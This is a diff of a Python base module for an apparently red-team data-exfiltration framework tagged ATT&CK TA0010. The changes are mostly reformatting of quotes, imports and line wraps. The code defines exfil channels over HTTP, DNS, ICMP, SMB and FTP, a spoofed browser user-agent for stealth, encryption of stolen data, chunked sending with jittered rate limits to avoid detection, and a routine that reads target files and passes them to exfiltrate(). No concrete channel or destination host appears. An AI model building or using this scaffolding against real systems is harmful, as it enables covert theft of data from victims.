@@ -7,13 +7,13 @@ ATT&CK Tactic: TA0010 - Exfiltration
 仅用于授权渗透测试和安全研究
 """
 
-from abc import ABC, abstractmethod
-from dataclasses import dataclass, field
-from typing import Optional, Dict, Any, List, Generator
-from enum import Enum
+import hashlib
 import logging
 import time
-import hashlib
+from abc import ABC, abstractmethod
+from dataclasses import dataclass, field
+from enum import Enum
+from typing import Any, Dict, Generator, List, Optional
 
 logger = logging.getLogger(__name__)
 
@@ -22,34 +22,37 @@ class ExfilChannel(Enum):
     """
     外泄通道枚举
     """
-    HTTP = 'http'
-    HTTPS = 'https'
-    DNS = 'dns'
-    ICMP = 'icmp'
-    SMB = 'smb'
-    FTP = 'ftp'
+
+    HTTP = "http"
+    HTTPS = "https"
+    DNS = "dns"
+    ICMP = "icmp"
+    SMB = "smb"
+    FTP = "ftp"
 
 
 class ExfilStatus(Enum):
     """
     外泄状态枚举
     """
-    IDLE = 'idle'
-    PREPARING = 'preparing'
-    CONNECTING = 'connecting'
-    TRANSFERRING = 'transferring'
-    COMPLETED = 'completed'
-    FAILED = 'failed'
-    PAUSED = 'paused'
-    ERROR = 'error'
+
+    IDLE = "idle"
+    PREPARING = "preparing"
+    CONNECTING = "connecting"
+    TRANSFERRING = "transferring"
+    COMPLETED = "completed"
+    FAILED = "failed"
+    PAUSED = "paused"
+    ERROR = "error"
 
 
 class EncryptionType(Enum):
     """加密类型"""
-    NONE = 'none'
-    AES_256_GCM = 'aes256gcm'
-    CHACHA20_POLY1305 = 'chacha20'
-    XOR = 'xor'
+
+    NONE = "none"
+    AES_256_GCM = "aes256gcm"
+    CHACHA20_POLY1305 = "chacha20"
+    XOR = "xor"
 
 
 @dataclass
@@ -59,9 +62,10 @@ class ExfilConfig:
 
     包含通道、加密、速率限制等配置
     """
+
     # 通道配置
     channel: ExfilChannel = ExfilChannel.HTTPS
-    destination: str = ''
+    destination: str = ""
     port: int = 0  # 0 = 使用默认端口
 
     # 加密配置
@@ -79,10 +83,10 @@ class ExfilConfig:
 
     # 伪装配置
     stealth: bool = False
-    user_agent: str = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
     # DNS 专用
-    dns_domain: str = ''
+    dns_domain: str = ""
     dns_subdomain_length: int = 63
     nameserver: Optional[str] = None
 
@@ -112,26 +116,28 @@ class ExfilConfig:
         # 自动生成加密密钥
         if self.encryption and self.encryption_key is None:
             import secrets
+
             self.encryption_key = secrets.token_bytes(32)
 
     def to_dict(self) -> Dict[str, Any]:
         """转换为字典"""
         return {
-            'channel': self.channel.value,
-            'destination': self.destination,
-            'port': self.port,
-            'encryption': self.encryption,
-            'chunk_size': self.chunk_size,
-            'rate_limit': self.rate_limit,
-            'stealth': self.stealth,
-            'dns_domain': self.dns_domain,
-            'nameserver': self.nameserver,
+            "channel": self.channel.value,
+            "destination": self.destination,
+            "port": self.port,
+            "encryption": self.encryption,
+            "chunk_size": self.chunk_size,
+            "rate_limit": self.rate_limit,
+            "stealth": self.stealth,
+            "dns_domain": self.dns_domain,
+            "nameserver": self.nameserver,
         }
 
 
 @dataclass
 class ExfilProgress:
     """传输进度"""
+
     total_size: int = 0
     transferred: int = 0
     chunks_sent: int = 0
@@ -151,19 +157,19 @@ class ExfilProgress:
     def eta_seconds(self) -> float:
         """预计剩余时间"""
         if self.current_speed == 0:
-            return float('inf')
+            return float("inf")
         remaining = self.total_size - self.transferred
         return remaining / self.current_speed
 
     def to_dict(self) -> Dict[str, Any]:
         return {
-            'total_size': self.total_size,
-            'transferred': self.transferred,
-            'chunks_sent': self.chunks_sent,
-            'chunks_total': self.chunks_total,
-            'progress_percent': round(self.progress_percent, 2),
-            'current_speed': self.current_speed,
-            'eta_seconds': self.eta_seconds if self.eta_seconds != float('inf') else None,
+            "total_size": self.total_size,
+            "transferred": self.transferred,
+            "chunks_sent": self.chunks_sent,
+            "chunks_total": self.chunks_total,
+            "progress_percent": round(self.progress_percent, 2),
+            "current_speed": self.current_speed,
+            "eta_seconds": self.eta_seconds if self.eta_seconds != float("inf") else None,
         }
 
 
@@ -172,14 +178,15 @@ class ExfilResult:
     """
     外泄结果
     """
+
     success: bool
     channel: ExfilChannel
     total_size: int = 0
     transferred: int = 0
     duration: float = 0.0
     chunks_sent: int = 0
-    file_hash: str = ''
-    error: str = ''
+    file_hash: str = ""
+    error: str = ""
 
     @property
     def transfer_rate(self) -> float:
@@ -191,15 +198,15 @@ class ExfilResult:
     def to_dict(self) -> Dict[str, Any]:
         """转换为字典"""
         return {
-            'success': self.success,
-            'channel': self.channel.value,
-            'total_size': self.total_size,
-            'transferred': self.transferred,
-            'duration': round(self.duration, 2),
-            'chunks_sent': self.chunks_sent,
-            'transfer_rate': round(self.transfer_rate, 2),
-            'file_hash': self.file_hash,
-            'error': self.error,
+            "success": self.success,
+            "channel": self.channel.value,
+            "total_size": self.total_size,
+            "transferred": self.transferred,
+            "duration": round(self.duration, 2),
+            "chunks_sent": self.chunks_sent,
+            "transfer_rate": round(self.transfer_rate, 2),
+            "file_hash": self.file_hash,
+            "error": self.error,
         }
 
     def __bool__(self) -> bool:
@@ -230,8 +237,8 @@ class BaseExfiltration(ABC):
     """
 
     # 子类必须覆盖
-    name: str = 'base'
-    description: str = 'Base Exfiltration Module'
+    name: str = "base"
+    description: str = "Base Exfiltration Module"
     channel: ExfilChannel = ExfilChannel.HTTP
 
     def __init__(self, config: ExfilConfig):
@@ -302,7 +309,7 @@ class BaseExfiltration(ABC):
         self.progress = ExfilProgress(
             total_size=total_size,
             chunks_total=(total_size // self.config.chunk_size) + 1,
-            start_time=start_time
+            start_time=start_time,
         )
 
         # 加密数据
@@ -317,7 +324,7 @@ class BaseExfiltration(ABC):
                 channel=self.channel,
                 total_size=total_size,
                 file_hash=file_hash,
-                error="Failed to establish connection"
+                error="Failed to establish connection",
             )
 
         self._set_status(ExfilStatus.TRANSFERRING)
@@ -364,7 +371,7 @@ class BaseExfiltration(ABC):
                 transferred=self.progress.transferred,
                 duration=time.time() - start_time,
                 chunks_sent=self.progress.chunks_sent,
-                file_hash=file_hash
+                file_hash=file_hash,
             )
 
         except Exception as e:
@@ -377,7 +384,7 @@ class BaseExfiltration(ABC):
                 duration=time.time() - start_time,
                 chunks_sent=self.progress.chunks_sent,
                 file_hash=file_hash,
-                error=str(e)
+                error=str(e),
             )
 
         finally:
@@ -393,52 +400,48 @@ class BaseExfiltration(ABC):
         Returns:
             ExfilResult
         """
-        from pathlib import Path
         import os
+        from pathlib import Path
 
         try:
             # 安全：在resolve()之前检查符号链接
             original_path = Path(file_path)
 
             # 检查路径中的所有组件是否包含符号链接（使用lstat）
-            import stat as stat_module
             import errno
+            import stat as stat_module
 
-            parts = original_path.parts if original_path.is_absolute() else (Path.cwd() / original_path).parts
+            parts = (
+                original_path.parts
+                if original_path.is_absolute()
+                else (Path.cwd() / original_path).parts
+            )
             for i in range(len(parts)):
-                partial = Path(*parts[:i+1])
+                partial = Path(*parts[: i + 1])
                 try:
                     # 使用lstat()检查符号链接，不跟随链接
                     stat_info = partial.lstat()
                     if stat_module.S_ISLNK(stat_info.st_mode):
                         self.logger.warning(f"Symlink detected in path component: {partial}")
                         return ExfilResult(
-                            success=False,
-                            channel=self.channel,
-                            error="Access denied"
+                            success=False, channel=self.channel, error="Access denied"
                         )
                 except PermissionError:
                     # 无法访问的路径也应拒绝
                     self.logger.warning(f"Permission denied accessing path component: {partial}")
-                    return ExfilResult(
-                        success=False,
-                        channel=self.channel,
-                        error="Access denied"
-                    )
+                    return ExfilResult(success=False, channel=self.channel, error="Access denied")
                 except OSError as e:
                     # 路径不存在是预期行为，继续检查
                     if e.errno not in (errno.ENOENT, errno.ENOTDIR):
                         self.logger.error(f"Unexpected OS error during symlink check: {e}")
                         return ExfilResult(
-                            success=False,
-                            channel=self.channel,
-                            error="Access denied"
+                            success=False, channel=self.channel, error="Access denied"
                         )
 
             # 安全：检查路径遍历（增强版，防止编码绕过）
-            import urllib.parse
-            import unicodedata
             import re
+            import unicodedata
+            import urllib.parse
 
             try:
                 # 使用resolve()获取绝对路径
@@ -453,42 +456,38 @@ class BaseExfiltration(ABC):
                     decoded_path = new_decoded
 
                 # Unicode规范化（防止Unicode绕过）
-                normalized_path = unicodedata.normalize('NFKC', decoded_path)
+                normalized_path = unicodedata.normalize("NFKC", decoded_path)
 
                 # 统一路径分隔符
-                unified_path = normalized_path.replace('\\', '/')
+                unified_path = normalized_path.replace("\\", "/")
 
                 # 移除多余的斜杠
-                cleaned_path = re.sub(r'/+', '/', unified_path)
+                cleaned_path = re.sub(r"/+", "/", unified_path)
 
                 # 检查路径遍历模式
                 traversal_patterns = [
-                    r'\.\.\/',      # ../
-                    r'\/\.\.',      # /..
-                    r'^\.\.',       # 开头的..
-                    r'\.\.$',       # 结尾的..
-                    r'\.\.\.',      # 多个点
+                    r"\.\.\/",  # ../
+                    r"\/\.\.",  # /..
+                    r"^\.\.",  # 开头的..
+                    r"\.\.$",  # 结尾的..
+                    r"\.\.\.",  # 多个点
                 ]
 
                 for pattern in traversal_patterns:
                     if re.search(pattern, cleaned_path):
-                        self.logger.warning(f"Path traversal pattern detected after normalization: {pattern}")
+                        self.logger.warning(
+                            f"Path traversal pattern detected after normalization: {pattern}"
+                        )
                         return ExfilResult(
-                            success=False,
-                            channel=self.channel,
-                            error="Access denied"
+                            success=False, channel=self.channel, error="Access denied"
                         )
 
             except (OSError, RuntimeError) as e:
                 self.logger.error(f"Path resolution failed: {e}")
-                return ExfilResult(
-                    success=False,
-                    channel=self.channel,
-                    error="Access denied"
-                )
+                return ExfilResult(success=False, channel=self.channel, error="Access denied")
 
             # 可选：白名单检查
-            if hasattr(self.config, 'allowed_base_path') and self.config.allowed_base_path:
+            if hasattr(self.config, "allowed_base_path") and self.config.allowed_base_path:
                 allowed_base = Path(self.config.allowed_base_path).resolve(strict=True)
 
                 # 确保resolved_path在allowed_base下
@@ -497,9 +496,7 @@ class BaseExfiltration(ABC):
                     if not resolved_path.is_relative_to(allowed_base):
                         self.logger.warning(f"Path outside allowed directory: {file_path}")
                         return ExfilResult(
-                            success=False,
-                            channel=self.channel,
-                            error="Access denied"
+                            success=False, channel=self.channel, error="Access denied"
                         )
                 except AttributeError:
                     # Python 3.8兼容性
@@ -508,9 +505,7 @@ class BaseExfiltration(ABC):
                     except ValueError:
                         self.logger.warning(f"Path outside allowed directory: {file_path}")
                         return ExfilResult(
-                            success=False,
-                            channel=self.channel,
-                            error="Access denied"
+                            success=False, channel=self.channel, error="Access denied"
                         )
 
             # 使用O_NOFOLLOW防御TOCTOU和符号链接攻击
@@ -521,14 +516,14 @@ class BaseExfiltration(ABC):
             try:
                 # 在Unix系统上使用O_NOFOLLOW
                 flags = os.O_RDONLY
-                if hasattr(os, 'O_NOFOLLOW'):
+                if hasattr(os, "O_NOFOLLOW"):
                     flags |= os.O_NOFOLLOW
 
                 # 打开文件描述符
                 fd = os.open(str(resolved_path), flags)
                 try:
                     # 使用文件描述符读取，完全消除TOCTOU窗口
-                    with os.fdopen(fd, 'rb') as f:
+                    with os.fdopen(fd, "rb") as f:
                         # 验证文件类型和属性
                         stat_info = os.fstat(f.fileno())
                         import stat as stat_module
@@ -537,33 +532,29 @@ class BaseExfiltration(ABC):
                         if not stat_module.S_ISREG(stat_info.st_mode):
                             self.logger.warning(f"Not a regular file: {file_path}")
                             return ExfilResult(
-                                success=False,
-                                channel=self.channel,
-                                error="Access denied"
+                                success=False, channel=self.channel, error="Access denied"
                             )
 
                         # 检查危险权限位（setuid/setgid）
                         if stat_info.st_mode & (stat_module.S_ISUID | stat_module.S_ISGID):
                             self.logger.warning(f"Setuid/setgid file detected: {file_path}")
                             return ExfilResult(
-                                success=False,
-                                channel=self.channel,
-                                error="Access denied"
+                                success=False, channel=self.channel, error="Access denied"
                             )
 
                         # 检查文件大小
                         if stat_info.st_size > MAX_FILE_SIZE:
-                            self.logger.warning(f"File too large: {stat_info.st_size} bytes (max: {MAX_FILE_SIZE})")
+                            self.logger.warning(
+                                f"File too large: {stat_info.st_size} bytes (max: {MAX_FILE_SIZE})"
+                            )
                             return ExfilResult(
-                                success=False,
-                                channel=self.channel,
-                                error="Access denied"
+                                success=False, channel=self.channel, error="Access denied"
                             )
 
                         # 检查空文件
                         if stat_info.st_size == 0:
                             self.logger.info(f"Empty file: {file_path}")
-                            return self.exfiltrate(b'')
+                            return self.exfiltrate(b"")
 
                         # 分块读取，防止内存耗尽
                         chunks = []
@@ -579,62 +570,36 @@ class BaseExfiltration(ABC):
                             if total_read > MAX_FILE_SIZE:
                                 self.logger.warning(f"File size exceeded during read: {total_read}")
                                 return ExfilResult(
-                                    success=False,
-                                    channel=self.channel,
-                                    error="Access denied"
+                                    success=False, channel=self.channel, error="Access denied"
                                 )
 
-                        data = b''.join(chunks)
+                        data = b"".join(chunks)
                         return self.exfiltrate(data)
 
                 except Exception as e:
                     # fdopen成功后，文件描述符由文件对象管理，不需要手动关闭
                     self.logger.error(f"File read error: {e}")
-                    return ExfilResult(
-                        success=False,
-                        channel=self.channel,
-                        error="Access denied"
-                    )
+                    return ExfilResult(success=False, channel=self.channel, error="Access denied")
 
             except FileNotFoundError:
                 self.logger.info(f"File not found: {file_path}")
-                return ExfilResult(
-                    success=False,
-                    channel=self.channel,
-                    error="Access denied"
-                )
+                return ExfilResult(success=False, channel=self.channel, error="Access denied")
             except PermissionError:
                 self.logger.warning(f"Permission denied: {file_path}")
-                return ExfilResult(
-                    success=False,
-                    channel=self.channel,
-                    error="Access denied"
-                )
+                return ExfilResult(success=False, channel=self.channel, error="Access denied")
             except IsADirectoryError:
                 self.logger.warning(f"Is a directory: {file_path}")
-                return ExfilResult(
-                    success=False,
-                    channel=self.channel,
-                    error="Access denied"
-                )
+                return ExfilResult(success=False, channel=self.channel, error="Access denied")
             except OSError as e:
                 # O_NOFOLLOW会在遇到符号链接时抛出OSError
-                if hasattr(os, 'O_NOFOLLOW'):
+                if hasattr(os, "O_NOFOLLOW"):
                     self.logger.warning(f"Symlink or OS error: {file_path}")
-                    return ExfilResult(
-                        success=False,
-                        channel=self.channel,
-                        error="Access denied"
-                    )
+                    return ExfilResult(success=False, channel=self.channel, error="Access denied")
                 raise
 
         except Exception as e:
             self.logger.error(f"File read error: {str(e)}")
-            return ExfilResult(
-                success=False,
-                channel=self.channel,
-                error="Access denied"
-            )
+            return ExfilResult(success=False, channel=self.channel, error="Access denied")
 
     def _chunk_data(self, data: bytes) -> Generator[bytes, None, None]:
         """
@@ -648,7 +613,7 @@ class BaseExfiltration(ABC):
         """
         chunk_size = self.config.chunk_size
         for i in range(0, len(data), chunk_size):
-            yield data[i:i + chunk_size]
+            yield data[i : i + chunk_size]
 
     def _encrypt(self, data: bytes) -> bytes:
         """
@@ -668,16 +633,21 @@ class BaseExfiltration(ABC):
 
         elif self.config.encryption_type == EncryptionType.XOR:
             # 简单 XOR 加密
-            key = self.config.encryption_key or b'\x42' * 32
+            key = self.config.encryption_key or b"\x42" * 32
             return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
 
         elif self.config.encryption_type == EncryptionType.AES_256_GCM:
             # AES-256-GCM 加密
             try:
-                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                 import os
 
-                key = self.config.encryption_key[:32] if self.config.encryption_key else os.urandom(32)
+                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+                key = (
+                    self.config.encryption_key[:32]
+                    if self.config.encryption_key
+                    else os.urandom(32)
+                )
                 nonce = os.urandom(12)
                 aesgcm = AESGCM(key)
                 ciphertext = aesgcm.encrypt(nonce, data, None)
@@ -687,15 +657,20 @@ class BaseExfiltration(ABC):
 
             except ImportError:
                 self.logger.warning("cryptography not available, falling back to XOR")
-                key = self.config.encryption_key or b'\x42' * 32
+                key = self.config.encryption_key or b"\x42" * 32
                 return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
 
         elif self.config.encryption_type == EncryptionType.CHACHA20_POLY1305:
             try:
-                from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
                 import os
 
-                key = self.config.encryption_key[:32] if self.config.encryption_key else os.urandom(32)
+                from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
+
+                key = (
+                    self.config.encryption_key[:32]
+                    if self.config.encryption_key
+                    else os.urandom(32)
+                )
                 nonce = os.urandom(12)
                 chacha = ChaCha20Poly1305(key)
                 ciphertext = chacha.encrypt(nonce, data, None)
@@ -704,7 +679,7 @@ class BaseExfiltration(ABC):
 
             except ImportError:
                 self.logger.warning("cryptography not available, falling back to XOR")
-                key = self.config.encryption_key or b'\x42' * 32
+                key = self.config.encryption_key or b"\x42" * 32
                 return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
 
         return data
@@ -723,6 +698,7 @@ class BaseExfiltration(ABC):
             # 添加抖动
             if self.config.jitter > 0:
                 import random
+
                 jitter = sleep_time * self.config.jitter * random.uniform(-1, 1)
                 sleep_time = max(0, sleep_time + jitter)
 
@@ -743,15 +719,15 @@ class BaseExfiltration(ABC):
     def get_info(self) -> Dict[str, Any]:
         """获取模块信息"""
         return {
-            'name': self.name,
-            'description': self.description,
-            'channel': self.channel.value,
-            'status': self.status.value,
-            'destination': self.config.destination,
-            'encryption': self.config.encryption,
+            "name": self.name,
+            "description": self.description,
+            "channel": self.channel.value,
+            "status": self.status.value,
+            "destination": self.config.destination,
+            "encryption": self.config.encryption,
         }
 
-    def __enter__(self) -> 'BaseExfiltration':
+    def __enter__(self) -> "BaseExfiltration":
         """上下文管理器入口"""
         return self
 
@@ -769,11 +745,11 @@ class BaseExfiltration(ABC):
 
 # 导出
 __all__ = [
-    'ExfilChannel',
-    'ExfilStatus',
-    'EncryptionType',
-    'ExfilConfig',
-    'ExfilProgress',
-    'ExfilResult',
-    'BaseExfiltration',
+    "ExfilChannel",
+    "ExfilStatus",
+    "EncryptionType",
+    "ExfilConfig",
+    "ExfilProgress",
+    "ExfilResult",
+    "BaseExfiltration",
 ]
